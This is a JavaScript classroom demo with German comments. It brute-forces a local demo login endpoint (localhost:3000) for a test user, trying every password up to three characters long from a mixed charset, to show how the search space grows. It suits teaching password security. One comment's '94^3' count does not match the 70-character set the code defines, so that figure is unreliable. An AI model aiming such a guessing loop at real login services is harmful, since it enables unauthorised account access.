// Poly-Alphabet-Brute-Force: wie 2_1, aber mit vollem Zeichensatz
// (Klein- und Grossbuchstaben, Zahlen, Sonderzeichen).
// Zeigt, wie viel grösser der Suchraum dadurch wird -> es dauert viel länger.

// voller Zeichensatz: a-z, A-Z, 0-9 und ein paar Sonderzeichen
const charset =
  "abcdefghijklmnopqrstuvwxyz" +
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
  "0123456789" +
  "!@#$%^&*";

// klein gehalten, weil der volle Zeichensatz schon bei wenigen Stellen riesig wird
// (94^3 sind über 800'000 Kombinationen) -> sonst läuft die Demo zu lange
const maxLength = 3;

// kurzer Demo-Benutzer, dessen Passwort eine Ziffer enthält ("a7")
// -> nur mit vollem Zeichensatz findbar, geht aber trotzdem schnell
const username = "test";

// einen Login-Versuch schicken, true wenn das Passwort stimmt
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  return response.status === 200;
}

// baut das Passwort Zeichen für Zeichen auf (Rekursion), gleich wie bei 2_1
async function buildAndTry(prefix, length) {
  if (prefix.length === length) {
    const found = await tryLogin(username, prefix);
    if (found) {
      console.log("Passwort gefunden:", prefix);
      return true;
    }
    return false;
  }

  for (const char of charset) {
    const found = await buildAndTry(prefix + char, length);
    if (found) return true;
  }
  return false;
}

async function polyAlphabetAttack() {
  const start = Date.now();

  for (let length = 1; length <= maxLength; length++) {
    console.log("Probiere Länge", length, "...");
    const found = await buildAndTry("", length);
    if (found) break;
  }

  const seconds = (Date.now() - start) / 1000;
  console.log("Dauer:", seconds, "Sekunden");
}

polyAlphabetAttack();
